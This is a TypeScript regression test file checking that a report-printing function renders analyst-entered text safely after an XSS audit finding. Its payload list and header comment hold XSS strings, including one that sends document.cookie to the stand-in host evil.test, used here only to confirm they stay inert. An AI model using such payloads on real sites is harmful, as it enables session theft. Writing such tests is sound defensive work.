/**
 * FINDING-02 regression, restored.
 *
 * Both v1 print paths built HTML by template-interpolating analyst-authored
 * fields and handed the result to `document.write()`. A case titled
 *
 *     <img src=x onerror="fetch('https://evil.test/'+document.cookie)">
 *
 * executed on the same origin as the officer's session. `lib/report.ts` fixed
 * it by escape-BY-CONSTRUCTION -- `textContent` cannot produce markup, so there
 * is no escaping function to forget at the next call site.
 *
 * That fix has been asserted by nothing since `aa8789e` deleted the original
 * suite. These are the same payloads, put back through the surviving code.
 */
import { describe, it, expect, beforeEach, vi, afterEach } from "vitest";
import { openReport } from "@/lib/report";

/** The payload set from the Phase 1 audit, plus two aimed at the fix itself. */
const PAYLOADS = [
  `<img src=x onerror="fetch('https://evil.test/'+document.cookie)">`,
  `<script>alert(document.domain)</script>`,
  `"><svg/onload=alert(1)>`,
  `javascript:alert(1)`,
  `</td></tr><tr><td colspan=99><iframe src=//evil.test>`,
  `</style><script>alert(1)</script><style>`,
];

/**
 * A real (happy-dom) document standing in for the popup, so these assertions
 * run against genuine DOM construction rather than a string mock that could
 * not fail the way the bug did.
 */
function fakeWindow() {
  const doc = document.implementation.createHTMLDocument("");
  const printed = { count: 0 };
  return {
    document: doc,
    print: () => {
      printed.count += 1;
    },
    setTimeout: (fn: () => void) => {
      fn();
      return 0 as unknown as number;
    },
    printed,
  };
}

let win: ReturnType<typeof fakeWindow>;

beforeEach(() => {
  win = fakeWindow();
  vi.stubGlobal("window", { ...globalThis.window, open: () => win });
});
afterEach(() => vi.unstubAllGlobals());

const spec = (title: string, rows: string[]) => ({
  title,
  subtitle: title,
  columns: [{ header: title, value: (r: string) => r }],
  rows,
});

describe("openReport - escape by construction (FINDING-02)", () => {
  it("returns false rather than throwing when the popup is blocked", () => {
    vi.stubGlobal("window", { ...globalThis.window, open: () => null });
    expect(openReport(spec("t", []))).toBe(false);
  });

  it.each(PAYLOADS)("renders payload as text, never as markup: %s", (payload) => {
    expect(openReport(spec(payload, [payload]))).toBe(true);
    const doc = win.document;

    // The payload survives as TEXT...
    expect(doc.body.textContent).toContain(payload);

    // ...and produced no element it names. This is the assertion that fails on
    // the old interpolate-and-write path.
    expect(doc.querySelectorAll("img").length).toBe(0);
    expect(doc.querySelectorAll("svg").length).toBe(0);
    expect(doc.querySelectorAll("iframe").length).toBe(0);
    expect(doc.body.querySelectorAll("script").length).toBe(0);
  });

  it("puts the payload in a cell as literal text, with no injected siblings", () => {
    const payload = `</td></tr><tr><td colspan=99><iframe src=//evil.test>`;
    openReport(spec("Case", [payload]));
    const cells = win.document.querySelectorAll("tbody td");
    // One row, one column: interpolation would have produced extra cells.
    expect(cells.length).toBe(1);
    expect(cells[0].textContent).toBe(payload);
    expect(cells[0].children.length).toBe(0);
  });

  it("does not call document.write", () => {
    const write = vi.spyOn(win.document, "write");
    openReport(spec("Case", ["row"]));
    expect(write).not.toHaveBeenCalled();
  });

  it("emits no inline script into the generated document", () => {
    openReport(spec("Case", ["row"]));
    // A strict CSP on the parent must not be bypassable through this path.
    expect(win.document.querySelectorAll("script").length).toBe(0);
  });
});

describe("openReport - structure", () => {
  it("writes one header cell per column and one body cell per column per row", () => {
    const s = {
      title: "Actors",
      subtitle: "sub",
      columns: [
        { header: "id", value: (r: { id: string; n: number }) => r.id },
        { header: "n", value: (r: { id: string; n: number }) => String(r.n) },
      ],
      rows: [
        { id: "a", n: 1 },
        { id: "b", n: 2 },
      ],
    };
    openReport(s);
    expect(win.document.querySelectorAll("thead th").length).toBe(2);
    expect(win.document.querySelectorAll("tbody tr").length).toBe(2);
    expect(win.document.querySelectorAll("tbody td").length).toBe(4);
  });

  it("renders an empty state that spans the table rather than an empty grid", () => {
    openReport({ ...spec("Cases", []), emptyMessage: "No records" });
    const td = win.document.querySelector("tbody td") as HTMLTableCellElement;
    expect(td.textContent).toBe("No records");
    expect(td.colSpan).toBe(1);
  });

  it("states the record count, so a truncated report is visible as truncated", () => {
    openReport(spec("Cases", ["a", "b", "c"]));
    expect(win.document.querySelector(".meta")?.textContent).toContain("3 records");
  });

  it("triggers print exactly once", () => {
    openReport(spec("Cases", ["a"]));
    expect(win.printed.count).toBe(1);
  });
});
